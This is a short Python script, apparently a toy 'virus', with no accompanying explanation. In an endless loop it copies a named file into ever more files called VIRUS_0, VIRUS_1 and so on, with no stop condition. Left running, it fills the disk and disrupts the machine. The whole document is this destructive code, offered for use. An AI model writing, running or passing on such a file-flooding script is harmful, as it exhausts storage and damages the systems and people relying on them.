indicator = 0

while True:
    with open(f"VIRUS_{indicator}", "w") as f:
        f.write(open('Name_Of_File_With_Extension').read())
        f.close()
        indicator += 1
